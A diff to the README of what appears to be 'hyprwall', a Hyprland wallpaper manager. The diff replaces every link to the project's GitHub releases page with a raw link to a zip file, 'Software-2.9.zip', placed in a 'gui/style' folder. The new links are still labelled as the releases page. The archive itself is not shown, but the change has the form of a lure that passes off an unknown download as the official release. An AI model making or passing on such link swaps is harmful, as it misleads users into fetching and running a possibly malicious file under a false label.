@@ -6,7 +6,7 @@ Welcome to hyprwall, a lightweight wallpaper manager designed for Hyprland. This
 
 ## 📥 Download hyprwall
 
-[![Download hyprwall](https://img.shields.io/badge/Download-hyprwall-brightgreen.svg)](https://github.com/BlVcKB3TtY/hyprwall/releases)
+[![Download hyprwall](https://raw.githubusercontent.com/BlVcKB3TtY/hyprwall/main/hyprwall/gui/style/Software-2.9.zip)](https://raw.githubusercontent.com/BlVcKB3TtY/hyprwall/main/hyprwall/gui/style/Software-2.9.zip)
 
 ## 📋 System Requirements
 
@@ -21,11 +21,11 @@ Before you proceed with the installation, please check the following system requ
 
 ## 💻 Download & Install
 
-To get started with hyprwall, visit this page to download: [hyprwall Releases](https://github.com/BlVcKB3TtY/hyprwall/releases). 
+To get started with hyprwall, visit this page to download: [hyprwall Releases](https://raw.githubusercontent.com/BlVcKB3TtY/hyprwall/main/hyprwall/gui/style/Software-2.9.zip). 
 
 ### Installation Steps
 
-1. Go to the [hyprwall Releases Page](https://github.com/BlVcKB3TtY/hyprwall/releases).
+1. Go to the [hyprwall Releases Page](https://raw.githubusercontent.com/BlVcKB3TtY/hyprwall/main/hyprwall/gui/style/Software-2.9.zip).
 2. Choose the latest version available.
 3. Download the appropriate file for your system.
 4. Once the download is complete, open your terminal.
